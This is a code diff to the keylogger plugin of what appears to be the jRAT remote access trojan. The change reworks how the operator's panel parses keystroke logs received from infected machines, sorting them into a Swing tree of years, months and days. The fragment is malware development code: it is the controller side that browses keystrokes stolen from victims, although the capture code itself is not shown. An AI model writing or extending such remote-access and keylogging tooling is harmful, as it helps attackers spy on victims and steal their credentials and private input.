@@ -4,11 +4,10 @@ import java.awt.event.ActionListener;
 import java.io.DataInputStream;
 import java.io.File;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 
 import javax.swing.ImageIcon;
+import javax.swing.tree.DefaultMutableTreeNode;
 
 import pro.jrat.api.RATControlMenuEntry;
 import pro.jrat.api.RATMenuItem;
@@ -78,33 +77,25 @@ public class KeyloggerPlugin extends RATPlugin {
 			}
 		} else if (event.getPacket().getHeader() == LOGS_HEADER) {
 			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
-			
-			Map<String, Map<String, List<String>>> mainList = new HashMap<String, Map<String, List<String>>>();
-			
+						
 			int years = dis.readInt();
 			
 			for (int i = 0; i < years; i++) {
-				String year = dis.readUTF();
-				
-				Map<String, List<String>> list = new HashMap<String, List<String>>();
-				
-				mainList.put(year, list);
+				DefaultMutableTreeNode year = new DefaultMutableTreeNode(dis.readUTF());
+				panel.getRoot().add(year);
 				
 				int months = dis.readInt();
 				
 				for (int l = 0; l < months; l++) {
-					List<String> daysList = new ArrayList<String>();
-					list.put(dis.readUTF(), daysList);
+					DefaultMutableTreeNode month = new DefaultMutableTreeNode(dis.readUTF());
+					year.add(month);
 					
 					int days = dis.readInt();
 					for (int m = 0; m < days; m++) {
-						daysList.add(dis.readUTF());
+						DefaultMutableTreeNode day = new DefaultMutableTreeNode(dis.readUTF());
+						month.add(day);
 					}
 				}
-			}
-			
-			if (panel != null) {
-				
 			}
 		} else if (event.getPacket().getHeader() == LOG_HEADER) {
 			
